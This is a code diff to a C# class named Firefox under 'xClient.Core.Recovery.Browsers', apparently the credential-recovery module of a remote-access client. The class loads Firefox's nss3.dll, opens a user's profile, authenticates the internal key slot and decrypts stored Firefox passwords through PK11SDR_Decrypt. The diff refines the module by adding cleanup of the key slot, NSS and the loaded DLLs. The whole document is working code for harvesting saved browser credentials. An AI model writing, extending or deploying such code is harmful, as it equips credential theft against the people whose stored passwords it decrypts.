@@ -19,7 +19,14 @@ namespace xClient.Core.Recovery.Browsers
     /// </summary>
     public static class Firefox
     {
-        public static IntPtr NssModule;
+        private static IntPtr _nssModule;
+
+        private static IntPtr _dll1;
+        private static IntPtr _dll2;
+        private static IntPtr _dll3;
+        private static IntPtr _dll4;
+        private static IntPtr _dll5;
+        private static long _keySlot;
 
         private static DirectoryInfo firefoxPath;
         private static DirectoryInfo firefoxProfilePath;
@@ -87,6 +94,23 @@ namespace xClient.Core.Recovery.Browsers
             {
             }
 
+            PK11_FreeSlot(_keySlot);
+            NSS_Shutdown();
+
+            if (_dll1 != IntPtr.Zero)
+                FreeLibrary(_dll1);
+            if (_dll2 != IntPtr.Zero)
+                FreeLibrary(_dll2);
+            if (_dll3 != IntPtr.Zero)
+                FreeLibrary(_dll3);
+            if (_dll4 != IntPtr.Zero)
+                FreeLibrary(_dll4);
+            if (_dll5 != IntPtr.Zero)
+                FreeLibrary(_dll5);
+
+            if (_nssModule != IntPtr.Zero)
+                FreeLibrary(_nssModule);
+
             return firefoxPasswords;
         }
 
@@ -144,27 +168,30 @@ namespace xClient.Core.Recovery.Browsers
         #endregion
 
         #region Functions
+
         private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
         {
             //Return if under firefox 35 (35+ supported)
             //Firefox changes their DLL heirarchy/code with different releases
             //So we need to avoid trying to load a DLL in the wrong order
             //To prevent pop up saying it could not load the DLL
-            if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major < new Version("35.0.0").Major)
+            if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major <
+                new Version("35.0.0").Major)
                 return;
 
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
-            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
-            NssModule = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "NSS_Init");
-            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
-           var test =  NSS_Init(firefoxProfilePath.FullName);
-            long keySlot = PK11_GetInternalKeySlot();
-            PK11_Authenticate(keySlot, true, 0);
+            _dll1 = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
+            _dll2 = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
+            _dll3 = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
+            _dll4 = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
+            _dll5 = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
+            _nssModule = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Init");
+            NSS_InitPtr NSS_Init = (NSS_InitPtr) Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
+            NSS_Init(firefoxProfilePath.FullName);
+            _keySlot = PK11_GetInternalKeySlot();
+            PK11_Authenticate(_keySlot, true, 0);
         }
+
         private static DateTime FromUnixTime(long unixTime)
         {
             DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
@@ -257,7 +284,10 @@ namespace xClient.Core.Recovery.Browsers
         static extern bool FreeLibrary(IntPtr hModule);
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate long NSS_InitPtr(string configdir);
+        private delegate int PK11_FreeSlotPtr(long keySlot);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int NSS_InitPtr(string configdir);
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);
@@ -344,39 +374,45 @@ namespace xClient.Core.Recovery.Browsers
 
         #region Delegate Handling
 
-        private static void NSS_Shutdown()
+        private static int NSS_Shutdown()
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "NSS_Shutdown");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Shutdown");
             NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
-            ptr();
-            FreeLibrary(NssModule);
-
+            return ptr();
         }
         // Credit: http://www.codeforge.com/article/249225
         private static long PK11_GetInternalKeySlot()
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "PK11_GetInternalKeySlot");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_GetInternalKeySlot");
             PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
             return ptr();
         }
         private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "PK11_Authenticate");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_Authenticate");
             PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
             return ptr(slot, loadCerts, wincx);
         }
         private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "NSSBase64_DecodeBuffer");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSSBase64_DecodeBuffer");
             NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
             return ptr(arenaOpt, outItemOpt, inStr, inLen);
         }
         private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(NssModule, "PK11SDR_Decrypt");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11SDR_Decrypt");
             PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
             return ptr(ref data, ref result, cx);
         }
+
+        private static int PK11_FreeSlot(long keySlot)
+        {
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_FreeSlot");
+            PK11_FreeSlotPtr ptr = (PK11_FreeSlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_FreeSlotPtr));
+            return ptr(keySlot);
+        }
+
         private static string Decrypt(string cypherText)
         {
             StringBuilder sb = new StringBuilder(cypherText);
